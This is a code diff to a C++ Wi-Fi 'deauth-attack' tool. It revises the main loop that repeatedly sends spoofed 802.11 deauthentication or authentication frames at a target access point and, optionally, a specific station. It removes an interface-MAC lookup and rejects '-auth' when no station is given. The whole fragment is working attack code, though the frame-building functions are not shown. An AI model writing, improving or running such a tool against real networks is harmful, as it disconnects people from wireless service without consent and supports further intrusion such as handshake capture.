@@ -35,27 +35,6 @@ bool parseMac(const char* macStr, uint8_t* macArr) {
     return false;
 }
 
-// Get interface MAC address
-bool getIfaceMac(const char* ifaceName, uint8_t* ifaceMac) {
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("socket");
-        return false;
-    }
-
-    struct ifreq ifr;
-    strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);
-    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
-        perror("ioctl(SIOCGIFHWADDR)");
-        close(sock);
-        return false;
-    }
-
-    memcpy(ifaceMac, ifr.ifr_hwaddr.sa_data, 6);
-    close(sock);
-    return true;
-}
-
 int main(int argc, char* argv[]) {
     if (argc < 3) {
         std::cerr << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
@@ -71,15 +50,7 @@ int main(int argc, char* argv[]) {
 
     const char* dev = argv[1];
     uint8_t apMac[6];
-    uint8_t ifaceMac[6]; // To store interface MAC address
-
-    if (!getIfaceMac(dev, ifaceMac)) {
-        std::cerr << "[-] Failed to get interface MAC address for " << dev << "\n";
-        return -1;
-    }
-    std::cout << "[+] Interface MAC address: " << std::hex;
-    for(int i=0; i<6; ++i) std::cout << (int)ifaceMac[i] << (i<5 ? ":" : "");
-    std::cout << std::dec << std::endl;
+    uint8_t stationMac[6] = {0,};
 
     if (!parseMac(argv[2], apMac)) {
         std::cerr << "[-] Invalid AP MAC address\n";
@@ -89,11 +60,11 @@ int main(int argc, char* argv[]) {
 
     bool hasStation = false;
     bool isAuth = false;
-    uint8_t stationMac[6] = {0,};
 
     if (argc >= 4) {
         if (strcmp(argv[3], "-auth") == 0) {
-            isAuth = true;
+            std::cerr << "[-] Error: Station MAC is required for -auth mode.\n";
+            return -1;
         } else {
             hasStation = true;
             if (!parseMac(argv[3], stationMac)) {
@@ -140,13 +111,13 @@ int main(int argc, char* argv[]) {
 
     while (keepRunning) {
         if (isAuth) {
-            if (!sendAuthFrame(sock, ifaceMac, apMac, hasStation ? stationMac : nullptr)) {
+            if (!sendAuthFrame(sock, apMac, stationMac)) {
                 std::cerr << "[-] Failed to send Auth frame\n";
             } else {
                 std::cout << "[+] Sent Auth frame\n";
             }
         } else {
-            if (!sendDeauthFrame(sock, ifaceMac, apMac, hasStation ? stationMac : nullptr)) {
+            if (!sendDeauthFrame(sock, apMac, hasStation ? stationMac : nullptr)) {
                 std::cerr << "[-] Failed to send Deauth frame\n";
             } else {
                 std::cout << "[+] Sent Deauth frame\n";
